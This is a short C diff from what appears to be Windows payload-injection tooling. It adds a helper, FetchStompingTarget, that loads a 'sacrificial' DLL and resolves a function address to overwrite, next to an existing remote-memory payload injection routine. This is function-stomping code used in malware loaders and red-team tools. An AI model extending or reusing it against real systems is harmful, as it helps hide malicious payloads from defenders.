@@ -710,4 +710,26 @@ BOOLEAN InjectPayloadRemoteMappedMemory
 	return TRUE;
 }
 
+BOOL FetchStompingTarget
+(
+	IN     LPSTR   pSacrificialDllName,
+	IN     LPSTR   pSacrificialFuncName,
+	   OUT PVOID* pTargetFunctionAddress
+)
+{
+	if (!pSacrificialDllName || !pSacrificialFuncName || !pTargetFunctionAddress) return FALSE;
+	HMODULE hSacrificialModule = NULL;
 
+	if (!(hSacrificialModule = LoadLibraryA(pSacrificialDllName)))
+	{
+		printf("[!] Failed To Load Dll: %s\n", pSacrificialDllName);
+		return FALSE;
+	}
+
+	if (!(*pTargetFunctionAddress = GetProcAddress(hSacrificialModule, pSacrificialFuncName))) 
+	{
+		printf("[!] Failed To Load Function: %s\n", pSacrificialFuncName);
+		return FALSE;
+	}
+	return TRUE;
+}
